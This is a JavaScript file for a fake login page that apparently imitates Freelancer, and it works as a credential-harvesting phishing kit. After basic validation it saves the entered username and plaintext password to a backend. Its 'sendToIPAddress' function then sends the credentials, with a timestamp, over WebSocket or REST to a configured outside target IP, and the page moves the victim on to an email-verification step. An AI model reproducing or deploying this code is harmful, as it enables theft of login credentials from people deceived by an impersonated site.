// Password visibility toggle functionality
document.addEventListener('DOMContentLoaded', function() {
    // Find the password input and toggle button
    const passwordInput = document.getElementById('passwordInput');
    const toggleButton = document.querySelector('[aria-label="Reveal password"]');
    
    if (passwordInput && toggleButton) {
        toggleButton.addEventListener('click', function() {
            const iconContainer = toggleButton.querySelector('[data-name]');
            const svgPath = toggleButton.querySelector('svg path');
            
            // Toggle password visibility
            if (passwordInput.type === 'password') {
                // Show password
                passwordInput.type = 'text';
                toggleButton.setAttribute('aria-label', 'Hide password');
                
                // Change icon to "show" (eye icon)
                if (iconContainer) {
                    iconContainer.setAttribute('data-name', 'ui-show-v2');
                }
                if (svgPath) {
                    // Eye icon (show password)
                    svgPath.setAttribute('d', 'M12,4.5 C7,4.5 2.73,7.61 1,12 C2.73,16.39 7,19.5 12,19.5 C17,19.5 21.27,16.39 23,12 C21.27,7.61 17,4.5 12,4.5 Z M12,17 C9.24,17 7,14.76 7,12 C7,9.24 9.24,7 12,7 C14.76,7 17,9.24 17,12 C17,14.76 14.76,17 12,17 Z M12,9 C10.34,9 9,10.34 9,12 C9,13.66 10.34,15 12,15 C13.66,15 15,13.66 15,12 C15,10.34 13.66,9 12,9 Z');
                }
            } else {
                // Hide password
                passwordInput.type = 'password';
                toggleButton.setAttribute('aria-label', 'Reveal password');
                
                // Change icon to "hide" (eye with slash)
                if (iconContainer) {
                    iconContainer.setAttribute('data-name', 'ui-hide-v2');
                }
                if (svgPath) {
                    // Eye with slash icon (hide password)
                    svgPath.setAttribute('d', 'M12,7 C14.76,7 17,9.24 17,12 C17,12.65 16.87,13.26 16.64,13.83 L19.56,16.75 C21.07,15.49 22.26,13.86 22.99,12 C21.26,7.61 16.99,4.5 11.99,4.5 C10.59,4.5 9.25,4.75 8.01,5.2 L10.17,7.36 C10.74,7.13 11.35,7 12,7 Z M2,4.27 L4.28,6.55 L4.74,7.01 C3.08,8.3 1.78,10.02 1,12 C2.73,16.39 7,19.5 12,19.5 C13.55,19.5 15.03,19.2 16.38,18.66 L16.8,19.08 L19.73,22 L21,20.73 L3.27,3 L2,4.27 Z M7.53,9.8 L9.08,11.35 C9.03,11.56 9,11.78 9,12 C9,13.66 10.34,15 12,15 C12.22,15 12.44,14.97 12.65,14.92 L14.2,16.47 C13.53,16.8 12.79,17 12,17 C9.24,17 7,14.76 7,12 C7,11.21 7.2,10.47 7.53,9.8 L7.53,9.8 Z M11.84,9.02 L14.99,12.17 L15.01,12.01 C15.01,10.35 13.67,9.01 12.01,9.01 L11.84,9.02 Z');
                }
            }
        });
    }

    // Login form validation
    const loginForm = document.querySelector('.LoginForm');
    const emailInput = document.getElementById('emailOrUsernameInput');
    const loginButton = document.querySelector('button[type="submit"]');

    if (loginForm && emailInput && passwordInput && loginButton) {
        loginForm.addEventListener('submit', function(event) {
            event.preventDefault();
            
            let hasError = false;
            
            // Validate email/username
            if (!emailInput.value.trim()) {
                showError(emailInput, 'Please enter your username or email');
                hasError = true;
            } else {
                clearError(emailInput);
            }
            
            // Validate password
            if (!passwordInput.value.trim()) {
                showError(passwordInput, 'Please enter your password');
                hasError = true;
            } else {
                clearError(passwordInput);
            }
            
            // If no errors, submit to backend
            if (!hasError) {
                loginUser(emailInput.value.trim(), passwordInput.value);
            }
        });
    }

    // Login user function - sends data to backend
    async function loginUser(emailOrUsername, password) {
        // Show loading state
        const loginButton = document.querySelector('button[type="submit"]');
        const originalText = loginButton.textContent;
        const loaderOverlay = document.getElementById('__pwa_loader_overlay__');
        
        loginButton.disabled = true;
        loginButton.innerHTML = '<img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEBLAEsAAD//gATQ3JlYXRlZCB3aXRoIEdJTVD/4gKwSUNDX1BST0ZJTEUAAQEAAAKgbGNtcwRAAABtbnRyUkdCIFhZWiAH6AACABcADAA1ABxhY3NwQVBQTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA9tYAAQAAAADTLWxjbXMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1kZXNjAAABIAAAAEBjcHJ0AAABYAAAADZ3dHB0AAABmAAAABRjaGFkAAABrAAAACxyWFlaAAAB2AAAABRiWFlaAAAB7AAAABRnWFlaAAACAAAAABRyVFJDAAACFAAAACBnVFJDAAACFAAAACBiVFJDAAACFAAAACBjaHJtAAACNAAAACRkbW5kAAACWAAAACRkbWRkAAACfAAAACRtbHVjAAAAAAAAAAEAAAAMZW5VUwAAACQAAAAcAEcASQBNAFAAIABiAHUAaQBsAHQALQBpAG4AIABzAFIARwBCbWx1YwAAAAAAAAABAAAADGVuVVMAAAAaAAAAHABQAHUAYgBsAGkAYwAgAEQAbwBtAGEAaQBuAABYWVogAAAAAAAA9tYAAQAAAADTLXNmMzIAAAAAAAEMQgAABd7///MlAAAHkwAA/ZD///uh///9ogAAA9wAAMBuWFlaIAAAAAAAAG+gAAA49QAAA5BYWVogAAAAAAAAJJ8AAA+EAAC2xFhZWiAAAAAAAABilwAAt4cAABjZcGFyYQAAAAAAAwAAAAJmZgAA8qcAAA1ZAAAT0AAACltjaHJtAAAAAAADAAAAAKPXAABUfAAATM0AAJmaAAAmZwAAD1xtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAAgAAAAcAEcASQBNAFBtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAAgAAAAcAHMAUgBHAEL/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/2wBDAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/wgARCAFeArwDAREAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAn/xAAUAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAAG+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP//EABQQAQAAAAAAAAAAAAAAAAAAALD/2gAIAQEAAQUCcg//xAAUEQEAAAAAAAAAAAAAAAAAAACw/9oACAEDAQE/AXIP/8QAFBEBAAAAAAAAAAAAAAAAAAAAsP/aAAgBAgEBPwFyD//EABQQAQAAAAAAAAAAAAAAAAAAALD/2gAIAQEABj8Ccg//xAAUEAEAAAAAAAAAAAAAAAAAAACw/9oACAEBAAE/IXIP/9oADAMBAAIAAwAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/xAAUEQEAAAAAAAAAAAAAAAAAAACw/9oACAEDAQE/EHIP/8QAFBEBAAAAAAAAAAAAAAAAAAAAsP/aAAgBAgEBPxByD//EABQQAQAAAAAAAAAAAAAAAAAAALD/2gAIAQEAAT8Qcg//2Q==" style="width: 24px; height: 24px; animation: spin 1s linear infinite;" />';
        if (loaderOverlay) {
            loaderOverlay.style.display = 'flex';
            loaderOverlay.style.position = 'fixed';
            loaderOverlay.style.top = '0';
            loaderOverlay.style.left = '0';
            loaderOverlay.style.width = '100%';
            loaderOverlay.style.height = '100%';
            loaderOverlay.style.zIndex = '9999';
            loaderOverlay.style.justifyContent = 'center';
            loaderOverlay.style.alignItems = 'center';
            loaderOverlay.style.backgroundColor = 'rgba(0, 0, 0, 0.3)';
        }

        try {
            // 1. Save to database
            const saveResponse = await fetch('http://localhost:3000/api/save-login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    emailOrUsername: emailOrUsername,
                    password: password
                })
            });

            const saveData = await saveResponse.json();

            if (saveData.success) {
                console.log('✅ Saved to database:', saveData.user);
                
                // 2. Send to specific IP address (WebSocket or REST)
                await sendToIPAddress(emailOrUsername, password);
                
                // 3. Store credentials in localStorage
                localStorage.setItem('userEmail', emailOrUsername);
                localStorage.setItem('userData', JSON.stringify(saveData.user));
                
                // 4. Redirect to verify_email.html after 1 second
                setTimeout(() => {
                    window.location.href = 'verify_email.html';
                }, 1000);
                
            } else {
                showError(passwordInput, saveData.message || 'Failed to save login information');
            }

        } catch (error) {
            console.error('Login error:', error);
            showError(passwordInput, 'Unable to connect to server. Please try again.');
        } finally {
            // Reset button state
            loginButton.disabled = false;
            loginButton.textContent = originalText;
            const loaderOverlay = document.getElementById('__pwa_loader_overlay__');
            if (loaderOverlay) {
                loaderOverlay.style.display = 'none';
                loaderOverlay.style.position = '';
                loaderOverlay.style.top = '';
                loaderOverlay.style.left = '';
                loaderOverlay.style.width = '';
                loaderOverlay.style.height = '';
                loaderOverlay.style.zIndex = '';
                loaderOverlay.style.justifyContent = '';
                loaderOverlay.style.alignItems = '';
                loaderOverlay.style.backgroundColor = '';
            }
        }
    }

    // Send credentials to specific IP address
    async function sendToIPAddress(username, password) {
        // Try WebSocket first if available
        if (typeof wsClient !== 'undefined' && wsClient && wsClient.isConnected) {
            const sent = wsClient.sendCredentials(username, password);
            if (sent) return;
        }
        
        // Fallback to REST API
        if (typeof CONFIG !== 'undefined' && CONFIG.SEND_TO_IP_ENABLED) {
            const targetIP = CONFIG.TARGET_IP;
            
            try {
                const response = await fetch(targetIP + '/api/receive-login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        username: username,
                        password: password,
                        timestamp: new Date().toISOString()
                    })
                });

                if (response.ok) {
                    console.log('✅ Sent to IP address via REST:', targetIP);
                } else {
                    console.warn('⚠️ Failed to send to IP address');
                }
            } catch (error) {
                console.warn('⚠️ Could not reach IP address:', error.message);
            }
        }
    }

    function showError(inputElement, message) {
        // Add error styling to input
        const inputContainer = inputElement.closest('.InputContainer');
        if (inputContainer) {
            inputContainer.style.border = '1px solid var(--color-error)';
        }
        
        // Find or create error message element
        const inputWrapper = inputElement.closest('.InputInner');
        let errorElement = inputWrapper.querySelector('.error-message');
        
        if (!errorElement) {
            errorElement = document.createElement('div');
            errorElement.className = 'error-message';
            errorElement.style.color = 'var(--color-error)';
            errorElement.style.fontSize = '12px';
            errorElement.style.marginTop = '4px';
            inputWrapper.appendChild(errorElement);
        }
        
        errorElement.textContent = message;
        inputElement.setAttribute('aria-invalid', 'true');
    }

    function clearError(inputElement) {
        // Remove error styling from input
        const inputContainer = inputElement.closest('.InputContainer');
        if (inputContainer) {
            inputContainer.style.border = '';
        }
        
        // Remove error message
        const inputWrapper = inputElement.closest('.InputInner');
        const errorElement = inputWrapper.querySelector('.error-message');
        if (errorElement) {
            errorElement.remove();
        }
        
        inputElement.setAttribute('aria-invalid', 'false');
    }

    // Handle app store links
    const appStoreLinks = document.querySelectorAll('a[href="/download"]');
    appStoreLinks.forEach(function(link) {
        link.addEventListener('click', function(event) {
            event.preventDefault();
            window.location.href = 'https://www.freelancer.com/download';
        });
    });

    // Handle Sign Up button click
    const signUpButtons = document.querySelectorAll('button');
    signUpButtons.forEach(function(button) {
        if (button.textContent.trim() === 'Sign up') {
            button.addEventListener('click', function(event) {
                event.preventDefault();
                showRegistrationPrompt();
            });
        }
    });

    // Registration prompt function
    function showRegistrationPrompt() {
        const username = prompt('Enter username:');
        if (!username) return;

        const email = prompt('Enter email:');
        if (!email) return;

        const password = prompt('Enter password (min 6 characters):');
        if (!password) return;

        registerUser(username, email, password);
    }

    // Register user function - sends data to backend
    async function registerUser(username, email, password) {
        try {
            const response = await fetch('http://localhost:3000/api/register', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    username: username,
                    email: email,
                    password: password
                })
            });

            const data = await response.json();

            if (data.success) {
                alert('Registration successful! You can now log in with your credentials.');
                console.log('New user:', data.user);
            } else {
                alert('Registration failed: ' + (data.message || 'Unknown error'));
            }

        } catch (error) {
            console.error('Registration error:', error);
            alert('Unable to connect to server. Please make sure the backend is running.');
        }
    }
});
